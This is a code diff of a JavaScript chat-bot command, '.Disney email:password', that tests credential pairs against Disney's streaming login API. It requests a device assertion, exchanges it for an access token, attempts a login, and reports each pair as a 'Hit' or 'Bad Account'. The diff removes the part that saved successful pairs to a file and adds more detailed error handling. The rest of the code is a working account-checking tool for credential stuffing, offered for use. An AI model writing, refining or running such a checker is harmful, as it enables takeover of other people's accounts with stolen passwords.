@@ -1,6 +1,4 @@
 import axios from 'axios';
-import fs from 'fs';
-import path from 'path';
 
 let handler = async (m, { conn, command, text, args, usedPrefix }) => {
   // Comando .Disney mail:pass
@@ -11,16 +9,7 @@ let handler = async (m, { conn, command, text, args, usedPrefix }) => {
       return conn.reply(m.chat, 'Formato inválido. Usa el formato: `.Disney email:password`', m);
     }
 
-    let hits = 0;
-    let bad = 0;
-
     try {
-      // Crear directorio donde guardar los resultados
-      const dir = path.join(__dirname, '/sdcard/HJ_Disney');
-      if (!fs.existsSync(dir)) {
-        fs.mkdirSync(dir, { recursive: true });
-      }
-
       // Configurar sesión y headers
       const session = axios.create();
       const headers = {
@@ -32,48 +21,46 @@ let handler = async (m, { conn, command, text, args, usedPrefix }) => {
       // Hacer la primera petición para obtener el assertion
       const deviceData = JSON.stringify({ deviceFamily: "browser", applicationRuntime: "chrome", deviceProfile: "windows", attributes: {} });
       const deviceResponse = await session.post('https://global.edge.bamgrid.com/devices', { headers, data: deviceData });
-      const assertion = deviceResponse.data.assertion;
-
-      if (!assertion) {
+      
+      if (!deviceResponse.data || !deviceResponse.data.assertion) {
         return conn.reply(m.chat, `Fallo al obtener assertion para ${email}`, m);
       }
+
+      const assertion = deviceResponse.data.assertion;
 
       // Hacer la segunda petición para obtener el token de acceso
       const tokenData = `grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=${assertion}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice`;
       const tokenResponse = await session.post('https://global.edge.bamgrid.com/token', { headers: { ...headers, 'content-type': 'application/x-www-form-urlencoded' }, data: tokenData });
-      const accessToken = tokenResponse.data.access_token;
 
-      if (!accessToken) {
+      if (!tokenResponse.data || !tokenResponse.data.access_token) {
         return conn.reply(m.chat, `Fallo al obtener el access token para ${email}`, m);
       }
+
+      const accessToken = tokenResponse.data.access_token;
 
       // Realizar login con las credenciales del usuario
       const loginHeaders = { ...headers, 'authorization': `Bearer ${accessToken}` };
       const loginData = JSON.stringify({ email, password });
       const loginResponse = await session.post('https://global.edge.bamgrid.com/idp/login', { headers: loginHeaders, data: loginData });
 
-      // Verificar si el login fue exitoso
-      if (loginResponse.data.includes('id_token')) {
-        hits++;
+      // Verificar si la respuesta contiene el id_token o algún otro indicador de éxito
+      if (loginResponse.data && loginResponse.data.id_token) {
         const successMessage = `Hit -> ${email}:${password} | By: @hjofc123`;
         console.log("\x1b[32m" + successMessage + "\x1b[0m");
-
-        // Guardar el hit en el archivo
-        fs.appendFileSync(path.join(__dirname, '/sdcard/HJ_Disney/Disney.txt'), `${email}:${password}\n${successMessage}\n`);
-        conn.reply(m.chat, successMessage, m);
+        conn.reply(m.chat, `Hit para ${email}`, m); // Solo mensaje de "Hit"
       } else {
-        bad++;
         console.log("\x1b[31mBAD Account >>", email, "\x1b[0m");
-        conn.reply(m.chat, `BAD Account >> ${email}`, m);
+        conn.reply(m.chat, `Bad Account para ${email}`, m); // Solo mensaje de "Bad"
       }
     } catch (error) {
       console.error('Error:', error);
-      bad++;
-      conn.reply(m.chat, `Error al verificar las credenciales para ${email}. Intenta nuevamente más tarde.`, m);
+      // Manejo de errores
+      if (error.response) {
+        conn.reply(m.chat, `Error en la respuesta del servidor para ${email}. Intenta nuevamente más tarde.`, m);
+      } else {
+        conn.reply(m.chat, `Error desconocido al verificar las credenciales para ${email}. Intenta nuevamente más tarde.`, m);
+      }
     }
-
-    // Resumen final
-    conn.reply(m.chat, `\nResumen final:\nHits ✅: ${hits}\nBad ❌: ${bad}\n`, m);
   }
 };
 
